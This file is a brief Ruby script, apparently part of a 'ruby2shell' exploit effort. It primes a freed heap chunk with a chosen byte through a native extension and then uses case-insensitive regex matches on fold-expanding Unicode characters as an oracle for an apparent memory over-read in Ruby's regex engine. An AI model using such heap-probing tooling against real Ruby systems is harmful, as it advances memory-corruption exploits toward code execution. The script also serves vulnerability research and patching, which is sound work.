#!/usr/bin/env ruby
# frozen_string_literal: true
# Usage: ruby ruby2shell-casefold-oracle.rb /abs/path/ruby2shell_casefold_oracle.so BYTE [COUNT]
# Compile /s/i after priming a freed 0x20 chunk with BYTE, then report the
# match outcome for one-byte-exact crossing subjects.  One process per byte.
require ARGV.fetch(0)
byte = Integer(ARGV.fetch(1))
count = Integer(ARGV.fetch(2) || "1")

SUBJECTS = {
  "sharp-s" => "\u00df",     # fold "ss"
  "sharp-cap" => "\u1e9e",   # fold "SS"
  "dotted-i" => "\u0130",    # fold "i" + combining dot
  "ascii-match" => "S",      # fold "s" (one byte, no over-read)
  "ascii-miss" => "t"        # fold "t"
}.freeze

out = []
SUBJECTS.each do |name, subject|
  Ruby2ShellCasefoldOracle.prime(byte, count)
  match = Regexp.new("s", Regexp::IGNORECASE).match?(subject)
  out << "#{name}=#{match}"
end
puts "ruby=#{RUBY_VERSION} byte=0x%02x count=#{count} #{out.join(' ')}" % byte
